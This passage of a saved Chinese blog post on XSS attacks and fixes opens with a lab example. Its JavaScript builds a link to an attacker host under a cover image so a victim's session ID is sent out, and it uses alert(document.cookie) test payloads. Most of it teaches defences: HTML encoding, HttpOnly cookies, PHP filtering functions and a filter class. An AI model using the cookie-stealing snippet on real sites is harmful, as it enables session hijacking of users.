+<span style="color: #008080;">15</span> <span style="background-color: #f5f5f5; color: #0000ff;">var</span><span style="background-color: #f5f5f5; color: #000000;"> a </span><span style="background-color: #f5f5f5; color: #000000;">=</span><span style="background-color: #f5f5f5; color: #000000;">document.createElement(</span><span style="background-color: #f5f5f5; color: #000000;">'</span><span style="background-color: #f5f5f5; color: #000000;">a</span><span style="background-color: #f5f5f5; color: #000000;">'</span><span style="background-color: #f5f5f5; color: #000000;">);        </span><span style="background-color: #f5f5f5; color: #008000;">//</span><span style="background-color: #f5f5f5; color: #008000;">创建a标签</span>
+<span style="color: #008080;">16</span> <span style="background-color: #f5f5f5; color: #000000;">a.href</span><span style="background-color: #f5f5f5; color: #000000;">=</span><span style="background-color: #f5f5f5; color: #000000;">'</span><span style="background-color: #f5f5f5; color: #000000;">http://www.linuxtest.com/test2.php?</span><span style="background-color: #f5f5f5; color: #000000;">'</span><span style="background-color: #f5f5f5; color: #000000;">+</span><span style="background-color: #f5f5f5; color: #000000;">Str;   </span><span style="background-color: #f5f5f5; color: #008000;">//</span><span style="background-color: #f5f5f5; color: #008000;">攻击者主机</span>
+<span style="color: #008080;">17</span> <span style="background-color: #f5f5f5; color: #000000;">a.innerHTML</span><span style="background-color: #f5f5f5; color: #000000;">=</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">&lt;img src='./aa.jpg'&gt;</span><span style="background-color: #f5f5f5; color: #000000;">"</span><span style="background-color: #f5f5f5; color: #000000;">;        </span><span style="background-color: #f5f5f5; color: #008000;">//</span><span style="background-color: #f5f5f5; color: #008000;">掩护图片</span>
+<span style="color: #008080;">18</span> <span style="background-color: #f5f5f5; color: #000000;">document.body.appendChild(a);              </span><span style="background-color: #f5f5f5; color: #008000;">//</span><span style="background-color: #f5f5f5; color: #008000;">将标签添加到页面中</span>
+<span style="color: #008080;">19</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">script</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;">20</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">body</span><span style="color: #0000ff;">&gt;</span>
+<span style="color: #008080;">21</span> <span style="color: #0000ff;">&lt;/</span><span style="color: #800000;">html</span><span style="color: #0000ff;">&gt;</span></pre>
+<div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div></div>
+<p>&nbsp;</p>
+<p><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/789055-20170426092026772-206750544.jpg" alt=""></p>
+<p>4、客户端不小心点击到图片，sessionID将被盗</p>
+<p><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/789055-20170426092202475-1331082631.jpg" alt=""></p>
+<div class="cnblogs_code">
+<pre><span style="color: #008000;">#</span><span style="color: #008000;"> vi xss.txt</span></pre>
+</div>
+<p>&nbsp;</p>
+<p><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/789055-20170426092310037-525099187.jpg" alt=""></p>
+<p>【当然这仅仅只是一个很简单的攻击，只要将数据过滤就可以避免这个攻击了，这里只是让大家了解XSS是如何进行攻击的。】</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label9"></a></div><h4 align="left">5、XSS漏洞修复</h4>
+<p>从上面XSS实例以及之前文章的介绍我们知道XSS漏洞的起因就是没有对用户提交的数据进行严格的过滤处理。因此在思考解决XSS漏洞的时候，我们应该重点把握如何才能更好的将用户提交的数据进行安全过滤。</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label10"></a></div><h4 align="left">　　5.1、html实体</h4>
+<p>什么是html实体？</p>
+<p>　　在html中有些字符，像(&lt;)这类的，对HTML(标准通用标记语言下的一个应用)来说是有特殊意义的，所以这些字符是不允许在文本中使用的。要在HTML中显示(&lt;)这个字符，我们就必须使用实体字符。</p>
+<p>　　html实体的存在是导致XSS漏洞的主要原因之一。</p>
+<p>　　因此我们需要将这些实体全部转换为相应的实体编号。</p>
+<table style="width: 709px;" border="1" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td valign="bottom" width="120">
+<p align="left">显示结果</p>
+</td>
+<td valign="bottom" width="120">
+<p align="left">描述</p>
+</td>
+<td valign="bottom" width="191">
+<p align="left">实体名称</p>
+</td>
+</tr>
+<tr>
+<td valign="top">
+<p align="left">&nbsp;</p>
+</td>
+<td valign="top">
+<p align="left">空格</p>
+</td>
+<td valign="top">
+<p align="left">&amp;nbsp;</p>
+</td>
+</tr>
+<tr>
+<td valign="top">
+<p align="left">&lt;&nbsp;</p>
+</td>
+<td valign="top">
+<p align="left">小于号</p>
+</td>
+<td valign="top">
+<p align="left">&amp;lt;</p>
+</td>
+</tr>
+<tr>
+<td valign="top">
+<p align="left">&gt;&nbsp;</p>
+</td>
+<td valign="top">
+<p align="left">大于号</p>
+</td>
+<td valign="top">
+<p align="left">&amp;gt;</p>
+</td>
+</tr>
+<tr>
+<td valign="top">
+<p align="left">&amp;</p>
+</td>
+<td valign="top">
+<p align="left">和号</p>
+</td>
+<td valign="top">
+<p align="left">&amp;amp;</p>
+</td>
+</tr>
+<tr>
+<td valign="top">
+<p align="left">"</p>
+</td>
+<td valign="top">
+<p align="left">引号</p>
+</td>
+<td valign="top">
+<p align="left">&amp;quot;</p>
+</td>
+</tr>
+<tr>
+<td valign="top">
+<p align="left">'</p>
+</td>
+<td valign="top">
+<p align="left">撇号&nbsp;</p>
+</td>
+<td valign="top">
+<p align="left">&amp;apos; (IE不支持)</p>
+</td>
+</tr>
+</tbody>
+</table>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label11"></a></div><h4 align="left">　　5.2、HTML Encode</h4>
+<p>用户将数据提交上来的时候进行HTML编码，将相应的符号转换为实体名称再进行下一步的处理。</p>
+<p>在PHP中已经存在这样子功能的函数，即是htmlentities($str)函数。</p>
+<p>与之相反的就是html_entity_decode($str)函数，它将实体名称转换为相应的符号。</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label12"></a></div><h4 align="left">　　5.3、修复漏洞方针</h4>
+<p>【不相应用户提交的数据，<strong>过滤过滤过滤！</strong>】</p>
+<p>1、将重要的cookie标记为http only, 这样的话Javascript 中的document.cookie语句就不能获取到cookie了.</p>
+<p>2、表单数据规定值的类型，例如：年龄应为只能为int、name只能为字母数字组合。。。。</p>
+<p>4、对数据进行Html Encode 处理</p>
+<p>5、过滤或移除特殊的Html标签， 例如: &lt;script&gt;, &lt;iframe&gt; , &amp;lt; for &lt;, &amp;gt; for &gt;, &amp;quot for</p>
+<p>6、过滤JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。</p>
+<p>【特别注意：】</p>
+<p>在有些应用中是允许html标签出现的，甚至是javascript代码出现。因此我们在过滤数据的时候需要仔细分析哪些数据是有特殊要求（例如输出需要html代码、javascript代码拼接、或者此表单直接允许使用等等），然后区别处理！</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label13"></a></div><h4 align="left">　　5.4、PHP中的相应函数</h4>
+<p>【详细看PHP手册】</p>
+<p>这里可能不全，想了解更多的看手册。</p>
+<p>strip_tags($str, [允许标签])&nbsp; #从字符串中去除 HTML 和 PHP 标记</p>
+<p>htmlentities($str)函数&nbsp;&nbsp;&nbsp; #转义html实体</p>
+<p>html_entity_decode($str)函数&nbsp;&nbsp;&nbsp; #反转义html实体</p>
+<p>addcslashes($str, ‘字符’)函数&nbsp;&nbsp;&nbsp;&nbsp; #给某些字符加上反斜杠</p>
+<p>stripcslashes($str)函数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #去掉反斜杠</p>
+<p>addslashes ($str )函数&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#单引号、双引号、反斜线与 NULL加反斜杠</p>
+<p>stripslashes($str)函数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #去掉反斜杠</p>
+<p>htmlspecialchars()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #特殊字符转换为HTML实体</p>
+<p>htmlspecialchars_decode()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #将特殊的 HTML 实体转换回普通字符</p>
+<div style="text-align: right"><a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#_labelTop">回到顶部</a><a name="_label14"></a></div><h4 align="left">　　5.5、数据过滤类</h4>
+<div class="cnblogs_code"><div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div>
+<pre><span style="color: #008080;"> 1</span> &lt;?<span style="color: #000000;">php
+</span><span style="color: #008080;"> 2</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> XSS
+</span><span style="color: #008080;"> 3</span> <span style="color: #000000;">{
+</span><span style="color: #008080;"> 4</span>     <span style="color: #008000;">/*</span><span style="color: #008000;">*
+</span><span style="color: #008080;"> 5</span> <span style="color: #008000;">    * @desc 过滤数据
+</span><span style="color: #008080;"> 6</span> <span style="color: #008000;">    *
+</span><span style="color: #008080;"> 7</span> <span style="color: #008000;">    * @param $data string|array 输入数据
+</span><span style="color: #008080;"> 8</span> <span style="color: #008000;">    * @param $low  bool      是否采用更为严格的过滤
+</span><span style="color: #008080;"> 9</span> <span style="color: #008000;">    *
+</span><span style="color: #008080;">10</span> <span style="color: #008000;">    * @return 返回过滤的数据
+</span><span style="color: #008080;">11</span>     <span style="color: #008000;">*/</span>
+<span style="color: #008080;">12</span>     <span style="color: #0000ff;">public</span> <span style="color: #0000ff;">function</span> clean_xss(<span style="color: #800080;">$data</span>, <span style="color: #800080;">$low</span> = <span style="color: #0000ff;">False</span><span style="color: #000000;">)
+</span><span style="color: #008080;">13</span> <span style="color: #000000;">    {
+</span><span style="color: #008080;">14</span>         <span style="color: #008000;">#</span><span style="color: #008000;">字符串过滤</span>
+<span style="color: #008080;">15</span>        <span style="color: #0000ff;">if</span> (! <span style="color: #008080;">is_array</span> ( <span style="color: #800080;">$data</span><span style="color: #000000;"> ))
+</span><span style="color: #008080;">16</span> <span style="color: #000000;">       {
+</span><span style="color: #008080;">17</span>            <span style="color: #800080;">$data</span> = <span style="color: #008080;">trim</span> ( <span style="color: #800080;">$data</span> );              <span style="color: #008000;">#</span><span style="color: #008000;">字符两边的处理</span>
+<span style="color: #008080;">18</span>            <span style="color: #800080;">$data</span> = <span style="color: #008080;">strip_tags</span> ( <span style="color: #800080;">$data</span> );        <span style="color: #008000;">#</span><span style="color: #008000;">从字符串中去除 HTML 和 PHP 标记</span>
+<span style="color: #008080;">19</span>            <span style="color: #800080;">$data</span> = <span style="color: #008080;">htmlspecialchars</span> ( <span style="color: #800080;">$data</span> );  <span style="color: #008000;">#</span><span style="color: #008000;">特殊字符转换为HTML实体</span>
+<span style="color: #008080;">20</span>            <span style="color: #0000ff;">if</span> (<span style="color: #800080;">$low</span><span style="color: #000000;">)
+</span><span style="color: #008080;">21</span> <span style="color: #000000;">           {
+</span><span style="color: #008080;">22</span>                <span style="color: #0000ff;">return</span> <span style="color: #800080;">$data</span><span style="color: #000000;">;
+</span><span style="color: #008080;">23</span> <span style="color: #000000;">           }
+</span><span style="color: #008080;">24</span>            <span style="color: #008000;">#</span><span style="color: #008000;">匹配换空格</span>
+<span style="color: #008080;">25</span>            <span style="color: #800080;">$data</span> = <span style="color: #008080;">str_replace</span> ( <span style="color: #0000ff;">array</span> ('"', "\\", "'", "/", "..", "../", "./", "//" ), '', <span style="color: #800080;">$data</span><span style="color: #000000;"> );
+</span><span style="color: #008080;">26</span>            <span style="color: #800080;">$no</span> = '/%0[0-8bcef]/'<span style="color: #000000;">; 
+</span><span style="color: #008080;">27</span>            <span style="color: #800080;">$data</span> = <span style="color: #008080;">preg_replace</span> ( <span style="color: #800080;">$no</span>, '', <span style="color: #800080;">$data</span><span style="color: #000000;"> );
+</span><span style="color: #008080;">28</span>            <span style="color: #800080;">$no</span> = '/%1[0-9a-f]/'<span style="color: #000000;">;
+</span><span style="color: #008080;">29</span>            <span style="color: #800080;">$data</span> = <span style="color: #008080;">preg_replace</span> ( <span style="color: #800080;">$no</span>, '', <span style="color: #800080;">$data</span><span style="color: #000000;"> );
+</span><span style="color: #008080;">30</span>            <span style="color: #800080;">$no</span> = '/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]+/S'<span style="color: #000000;">;
+</span><span style="color: #008080;">31</span>            <span style="color: #800080;">$data</span> = <span style="color: #008080;">preg_replace</span> ( <span style="color: #800080;">$no</span>, '', <span style="color: #800080;">$data</span><span style="color: #000000;"> );
+</span><span style="color: #008080;">32</span>            <span style="color: #0000ff;">return</span> <span style="color: #800080;">$data</span><span style="color: #000000;">;
+</span><span style="color: #008080;">33</span> <span style="color: #000000;">       }
+</span><span style="color: #008080;">34</span>        <span style="color: #008000;">#</span><span style="color: #008000;">数组过滤</span>
+<span style="color: #008080;">35</span>        <span style="color: #800080;">$arr</span>=<span style="color: #0000ff;">array</span><span style="color: #000000;">();
+</span><span style="color: #008080;">36</span>        <span style="color: #0000ff;">foreach</span> (<span style="color: #800080;">$data</span> <span style="color: #0000ff;">as</span> <span style="color: #800080;">$k</span> =&gt; <span style="color: #800080;">$v</span><span style="color: #000000;">) 
+</span><span style="color: #008080;">37</span> <span style="color: #000000;">       {
+</span><span style="color: #008080;">38</span>            <span style="color: #800080;">$temp</span>=<span style="color: #800080;">$this</span>-&gt;clean_xss(<span style="color: #800080;">$v</span><span style="color: #000000;">);
+</span><span style="color: #008080;">39</span>            <span style="color: #800080;">$arr</span>[<span style="color: #800080;">$k</span>]=<span style="color: #800080;">$temp</span><span style="color: #000000;">;
+</span><span style="color: #008080;">40</span> <span style="color: #000000;">       }
+</span><span style="color: #008080;">41</span>        <span style="color: #0000ff;">return</span> <span style="color: #800080;">$arr</span><span style="color: #000000;">;
+</span><span style="color: #008080;">42</span> <span style="color: #000000;">    }
+</span><span style="color: #008080;">43</span>     
+<span style="color: #008080;">44</span>     
+<span style="color: #008080;">45</span> <span style="color: #000000;">}
+</span><span style="color: #008080;">46</span> <span style="color: #008000;">#</span><span style="color: #008000;">测试测试</span>
+<span style="color: #008080;">47</span> <span style="color: #008080;">session_start</span><span style="color: #000000;">();
+</span><span style="color: #008080;">48</span> <span style="color: #800080;">$_SESSION</span>['xss']='xssss'<span style="color: #000000;">;
+</span><span style="color: #008080;">49</span> <span style="color: #800080;">$xss</span>=<span style="color: #0000ff;">new</span><span style="color: #000000;"> XSS();
+</span><span style="color: #008080;">50</span> <span style="color: #008000;">#</span><span style="color: #008000;">测试字符串</span>
+<span style="color: #008080;">51</span> <span style="color: #800080;">$str</span> = "&lt;script&gt;alert(document.cookie)&lt;/script&gt;"<span style="color: #000000;">;
+</span><span style="color: #008080;">52</span> <span style="color: #0000ff;">echo</span> <span style="color: #800080;">$str</span><span style="color: #000000;">;
+</span><span style="color: #008080;">53</span> <span style="color: #800080;">$str2</span>=<span style="color: #800080;">$xss</span>-&gt;clean_xss(<span style="color: #800080;">$str</span><span style="color: #000000;">);
+</span><span style="color: #008080;">54</span> <span style="color: #0000ff;">echo</span> <span style="color: #800080;">$str2</span><span style="color: #000000;">;
+</span><span style="color: #008080;">55</span> <span style="color: #0000ff;">echo</span> "&lt;hr/&gt;"<span style="color: #000000;">;
+</span><span style="color: #008080;">56</span> <span style="color: #008000;">#</span><span style="color: #008000;">测试数组</span>
+<span style="color: #008080;">57</span> <span style="color: #800080;">$arr</span>=<span style="color: #0000ff;">array</span>("&lt;script&gt;alert(document.cookie)&lt;/script&gt;","&lt;script&gt;alert(document.cookie)&lt;/script&gt;","&lt;script&gt;alert(document.cookie)&lt;/script&gt;"<span style="color: #000000;">);
+</span><span style="color: #008080;">58</span> <span style="color: #0000ff;">echo</span> "&lt;pre&gt;"<span style="color: #000000;">;
+</span><span style="color: #008080;">59</span> <span style="color: #008080;">print_r</span>(<span style="color: #800080;">$arr</span><span style="color: #000000;">);
+</span><span style="color: #008080;">60</span> <span style="color: #0000ff;">echo</span> "&lt;/pre&gt;"<span style="color: #000000;">;
+</span><span style="color: #008080;">61</span> <span style="color: #800080;">$arr2</span>=<span style="color: #800080;">$xss</span>-&gt;clean_xss(<span style="color: #800080;">$arr</span><span style="color: #000000;">);
+</span><span style="color: #008080;">62</span> <span style="color: #0000ff;">echo</span> "&lt;pre&gt;"<span style="color: #000000;">;
+</span><span style="color: #008080;">63</span> <span style="color: #008080;">print_r</span>(<span style="color: #800080;">$arr2</span><span style="color: #000000;">);
+</span><span style="color: #008080;">64</span> <span style="color: #0000ff;">echo</span> "&lt;/pre&gt;";<span style="color: #0000ff;">die</span><span style="color: #000000;">;
+</span><span style="color: #008080;">65</span> ?&gt;</pre>
+<div class="cnblogs_code_toolbar"><span class="cnblogs_code_copy"><a href="javascript:void(0);" onclick="copyCnblogsCode(this)" title="复制代码"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/copycode.gif" alt="复制代码"></a></span></div></div>
+<p>&nbsp;&nbsp;</p>
+<p>（以上是自己的一些见解与总结，若有不足或者错误的地方请各位指出）</p>
+<p>作者：<a href="http://www.cnblogs.com/phpstudy2015-6/" target="_blank">那一叶随风</a>&nbsp; &nbsp;<a href="http://www.cnblogs.com/phpstudy2015-6/" target="_blank">http://www.cnblogs.com/phpstudy2015-6/</a></p>
+<p>声明：以上只代表本人在工作学习中某一时间内总结的观点或结论。转载时请在文章页面明显位置给出原文链接</p>
+<p>&nbsp;</p>
+</div>
+<div id="MySignature" style="display: block;">执着</div>
+<div class="clear"></div>
+<div id="blog_post_info_block"><div id="BlogPostCategory">
+    分类: 
+            <a href="https://www.cnblogs.com/phpstudy2015-6/category/771534.html" target="_blank">PHP</a>,             <a href="https://www.cnblogs.com/phpstudy2015-6/category/990163.html" target="_blank">Web安全</a></div>
+<div id="EntryTag">
+    标签: 
+            <a href="https://www.cnblogs.com/phpstudy2015-6/tag/Web%E5%AE%89%E5%85%A8/">Web安全</a></div>
+
+    <div id="blog_post_info">
+<div id="green_channel">
+        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(6767032,cb_blogId,1);green_channel_success(this,&#39;谢谢推荐！&#39;);">好文要顶</a>
+        <a id="green_channel_follow" onclick="follow(&#39;80358ebd-d530-e511-b908-9dcfd8948a71&#39;);" href="javascript:void(0);">关注我</a>
+    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a>
+    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/icon_weibo_24.png" alt=""></a>
+    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/wechat.png" alt=""></a>
+</div>
+<div id="author_profile">
+    <div id="author_profile_info" class="author_profile_info">
+            <a href="https://home.cnblogs.com/u/phpstudy2015-6/" target="_blank"><img src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/20161204181900.png" class="author_avatar" alt=""></a>
+        <div id="author_profile_detail" class="author_profile_info">
+            <a href="https://home.cnblogs.com/u/phpstudy2015-6/">那一叶随风</a><br>
+            <a href="https://home.cnblogs.com/u/phpstudy2015-6/followees/">关注 - 19</a><br>
+            <a href="https://home.cnblogs.com/u/phpstudy2015-6/followers/">粉丝 - 244</a>
+        </div>
+    </div>
+    <div class="clear"></div>
+    <div id="author_profile_honor"></div>
+    <div id="author_profile_follow">
+                <a href="javascript:void(0);" onclick="follow(&#39;80358ebd-d530-e511-b908-9dcfd8948a71&#39;);return false;">+加关注</a>
+    </div>
+</div>
+<div id="div_digg"><div style="padding-bottom: 5px"><span class="icon_favorite" style="padding-top: 2px"></span><a onclick="cnblogs.UserManager.FollowBlogger(&#39;80358ebd-d530-e511-b908-9dcfd8948a71&#39;);" href="javascript:void(0);" style="font-weight: bold; padding-left:5px;">关注一下楼主吧</a> </div>
+    <div class="diggit" onclick="votePost(6767032,&#39;Digg&#39;)">
+        <span class="diggnum" id="digg_count">47</span>
+    </div>
+    <div class="buryit" onclick="votePost(6767032,&#39;Bury&#39;)">
+        <span class="burynum" id="bury_count">0</span>
+    </div>
+    <div class="clear"></div>
+    <div class="diggword" id="digg_tips">
+    </div>
+</div>
+
+<script type="text/javascript">
+    currentDiggType = 0;
+</script></div>
+    <div class="clear"></div>
+    <div id="post_next_prev">
+
+    <a href="https://www.cnblogs.com/phpstudy2015-6/p/6731707.html" class="p_n_p_prefix">« </a> 上一篇：    <a href="https://www.cnblogs.com/phpstudy2015-6/p/6731707.html" title="发布于 2017-04-21 12:08">单例模式</a>
+    <br>
+    <a href="https://www.cnblogs.com/phpstudy2015-6/p/6771239.html" class="p_n_p_prefix">» </a> 下一篇：    <a href="https://www.cnblogs.com/phpstudy2015-6/p/6771239.html" title="发布于 2017-04-27 16:19">CSRF攻击与防御</a>
+
+</div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date">2017-04-26 15:59</span>&nbsp;
+<a href="https://www.cnblogs.com/phpstudy2015-6/">那一叶随风</a>&nbsp;
+阅读(<span id="post_view_count">87822</span>)&nbsp;
+评论(<span id="post_comment_count">6</span>)&nbsp;
+<a href="https://i.cnblogs.com/EditPosts.aspx?postid=6767032" rel="nofollow">编辑</a>&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(6767032);return false;">收藏</a></div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+<script src="./XSS跨站脚本攻击 - 那一叶随风 - 博客园_files/highlight.min.js"></script>
+<script>markdown_highlight();</script>
+<script>
+    var allowComments = true, cb_blogId = 258167, cb_blogApp = 'phpstudy2015-6', cb_blogUserGuid = '80358ebd-d530-e511-b908-9dcfd8948a71';
+    var cb_entryId = 6767032, cb_entryCreatedDate = '2017-04-26 15:59', cb_postType = 1; 
+    loadViewCount(cb_entryId);
+</script><a name="!comments"></a>
+<div id="blog-comments-placeholder">
+
+<div id="comment_pager_top">
+    
+</div>
+
+<br>
+<div class="feedback_area_title">评论列表</div>
+<div class="feedbackNoItems"><div class="feedbackNoItems"></div></div>	
+		<div class="feedbackItem">
+			<div class="feedbackListSubtitle">
+				<div class="feedbackManage">
+					&nbsp;&nbsp;
+
+<span class="comment_actions">
+    
+    
+    
+    
+</span>
+
+
+				</div>
+				
+<a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#3824300" class="layer">#1楼</a>
+<a name="3824300" id="comment_anchor_3824300"></a>
+
+ 
+<span class="comment_date">2017-10-28 11:06</span>
+
+ 
+
+            <a id="a_comment_author_3824300" href="https://home.cnblogs.com/u/737022/" target="_blank">whuwzp</a>
+
+			</div>
+			<div class="feedbackCon">
+				
+<div id="comment_body_3824300" class="blog_comment_body">
+    例子讲得很好，赞
+</div>
+        <div class="comment_vote">
+            <span class="comment_error" style="color: red"></span>
+            <a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3824300, &#39;Digg&#39;, this.parentElement, false);">
+                支持(1)
+            </a>
+            <a href="javascript:void(0);" class="comment_burry" onclick="return voteComment(3824300, &#39;Bury&#39;, this.parentElement, false);">
+                反对(0)
+            </a>
+        </div>
+        
+
+			</div>
+		</div>
+		<div class="feedbackItem">
+			<div class="feedbackListSubtitle">
+				<div class="feedbackManage">
+					&nbsp;&nbsp;
+
+<span class="comment_actions">
+    
+    
+    
+    
+</span>
+
+
+				</div>
+				
+<a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#3890636" class="layer">#2楼</a>
+<a name="3890636" id="comment_anchor_3890636"></a>
+
+ 
+<span class="comment_date">2018-01-16 15:04</span>
+
+ 
+
+            <a id="a_comment_author_3890636" href="https://www.cnblogs.com/JAYIT/" target="_blank">Lost blog</a>
+
+			</div>
+			<div class="feedbackCon">
+				
+<div id="comment_body_3890636" class="blog_comment_body">
+    mark
+</div>
+        <div class="comment_vote">
+            <span class="comment_error" style="color: red"></span>
+            <a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3890636, &#39;Digg&#39;, this.parentElement, false);">
+                支持(0)
+            </a>
+            <a href="javascript:void(0);" class="comment_burry" onclick="return voteComment(3890636, &#39;Bury&#39;, this.parentElement, false);">
+                反对(0)
+            </a>
+        </div>
+        <span id="comment_3890636_avatar" style="display:none">
+            https://pic.cnblogs.com/face/380866/20150317113716.png
+        </span>
+
+			</div>
+		</div>
+		<div class="feedbackItem">
+			<div class="feedbackListSubtitle">
+				<div class="feedbackManage">
+					&nbsp;&nbsp;
+
+<span class="comment_actions">
+    
+    
+    
+    
+</span>
+
+
+				</div>
+				
+<a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#3906671" class="layer">#3楼</a>
+<a name="3906671" id="comment_anchor_3906671"></a>
+
+ 
+<span class="comment_date">2018-02-09 17:55</span>
+
+ 
+
+            <a id="a_comment_author_3906671" href="https://www.cnblogs.com/vipzhou/" target="_blank">西安-晁州</a>
+
+			</div>
+			<div class="feedbackCon">
+				
+<div id="comment_body_3906671" class="blog_comment_body">
+    不错，赞一个
+</div>
+        <div class="comment_vote">
+            <span class="comment_error" style="color: red"></span>
+            <a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3906671, &#39;Digg&#39;, this.parentElement, false);">
+                支持(0)
+            </a>
+            <a href="javascript:void(0);" class="comment_burry" onclick="return voteComment(3906671, &#39;Bury&#39;, this.parentElement, false);">
+                反对(0)
+            </a>
+        </div>
+        <span id="comment_3906671_avatar" style="display:none">
+            https://pic.cnblogs.com/face/798032/20180802200545.png
+        </span>
+
+			</div>
+		</div>
+		<div class="feedbackItem">
+			<div class="feedbackListSubtitle">
+				<div class="feedbackManage">
+					&nbsp;&nbsp;
+
+<span class="comment_actions">
+    
+    
+    
+    
+</span>
+
+
+				</div>
+				
+<a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#3912188" class="layer">#4楼</a>
+<a name="3912188" id="comment_anchor_3912188"></a>
+
+ 
+<span class="comment_date">2018-02-27 19:08</span>
+
+ 
+
+            <a id="a_comment_author_3912188" href="https://home.cnblogs.com/u/1268725/" target="_blank">胖虎小李</a>
+
+			</div>
+			<div class="feedbackCon">
+				
+<div id="comment_body_3912188" class="blog_comment_body">
+    学习了
+</div>
+        <div class="comment_vote">
+            <span class="comment_error" style="color: red"></span>
+            <a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3912188, &#39;Digg&#39;, this.parentElement, false);">
+                支持(0)
+            </a>
+            <a href="javascript:void(0);" class="comment_burry" onclick="return voteComment(3912188, &#39;Bury&#39;, this.parentElement, false);">
+                反对(0)
+            </a>
+        </div>
+        
+
+			</div>
+		</div>
+		<div class="feedbackItem">
+			<div class="feedbackListSubtitle">
+				<div class="feedbackManage">
+					&nbsp;&nbsp;
+
+<span class="comment_actions">
+    
+    
+    
+    
+</span>
+
+
+				</div>
+				
+<a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#3968586" class="layer">#5楼</a>
+<a name="3968586" id="comment_anchor_3968586"></a>
+
+ 
+<span class="comment_date">2018-05-06 21:22</span>
+
+ 
+
+            <a id="a_comment_author_3968586" href="https://www.cnblogs.com/edgexie/" target="_blank">edgexie</a>
+
+			</div>
+			<div class="feedbackCon">
+				
+<div id="comment_body_3968586" class="blog_comment_body">
+    火钳刘明
+</div>
+        <div class="comment_vote">
+            <span class="comment_error" style="color: red"></span>
+            <a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(3968586, &#39;Digg&#39;, this.parentElement, false);">
+                支持(0)
+            </a>
+            <a href="javascript:void(0);" class="comment_burry" onclick="return voteComment(3968586, &#39;Bury&#39;, this.parentElement, false);">
+                反对(0)
+            </a>
+        </div>
+        <span id="comment_3968586_avatar" style="display:none">
+            https://pic.cnblogs.com/face/946540/20161226103028.png
+        </span>
+
+			</div>
+		</div>
+		<div class="feedbackItem">
+			<div class="feedbackListSubtitle">
+				<div class="feedbackManage">
+					&nbsp;&nbsp;
+
+<span class="comment_actions">
+    
+    
+    
+    
+</span>
+
+
+				</div>
+				
+<a href="https://www.cnblogs.com/phpstudy2015-6/p/6767032.html#4080073" class="layer">#6楼</a>
+<a name="4080073" id="comment_anchor_4080073"></a>
+
+        <span id="comment-maxId" style="display:none">4080073</span>
+        <span id="comment-maxDate" style="display:none">2018/9/29 下午5:22:45</span>
+ 
+<span class="comment_date">2018-09-29 17:22</span>
+
+ 
+
+            <a id="a_comment_author_4080073" href="https://www.cnblogs.com/hxm-360/" target="_blank">问征夫以前路</a>
+
+			</div>
+			<div class="feedbackCon">
+				
+<div id="comment_body_4080073" class="blog_comment_body">
+    棒棒哒
+</div>
+        <div class="comment_vote">
+            <span class="comment_error" style="color: red"></span>
+            <a href="javascript:void(0);" class="comment_digg" onclick="return voteComment(4080073, &#39;Digg&#39;, this.parentElement, false);">
